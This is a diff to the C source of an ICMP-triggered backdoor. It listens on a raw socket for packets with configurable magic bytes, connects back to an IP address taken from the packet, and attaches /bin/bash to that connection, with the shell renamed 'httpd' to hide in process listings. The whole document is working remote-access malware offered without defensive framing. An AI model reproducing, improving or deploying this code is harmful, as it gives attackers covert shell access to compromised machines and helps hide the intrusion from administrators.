@@ -7,10 +7,17 @@
 #include <stdlib.h>
 #include <string.h>
 #include <signal.h>
+#include <errno.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+
+
+/* You should change these */
+#define MAGIC1		0x2a
+#define MAGIC2		0x7e
+#define PROGNAME	"httpd"
 
 
 int main(int argc, char *argv[]) {
@@ -29,6 +36,10 @@ int main(int argc, char *argv[]) {
   signal(SIGCHLD, SIG_IGN);
 
   s = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP);
+  if (s == -1) {
+    fprintf(stderr, "socket(): %s\n", strerror(errno));
+    return EXIT_FAILURE;
+  }
 
   for (;;) {
     memset(buf, 0, sizeof(buf));
@@ -36,7 +47,7 @@ int main(int argc, char *argv[]) {
     n = recv(s, buf, sizeof(buf), 0);
     if (n > 51) {
       /* Check for magic bytes */
-      if (buf[50] != 0x2a || buf[51] != 0x7e)
+      if (buf[50] != MAGIC1 || buf[51] != MAGIC2)
 	continue;
 
       ip[0] = buf[44];
@@ -62,7 +73,7 @@ int main(int argc, char *argv[]) {
 	dup2(c, STDOUT_FILENO);
 	dup2(c, STDIN_FILENO);
 
-	execl("/bin/bash", "put a fake name here", NULL);
+	execl("/bin/bash", PROGNAME, NULL);
       }
     }
   }
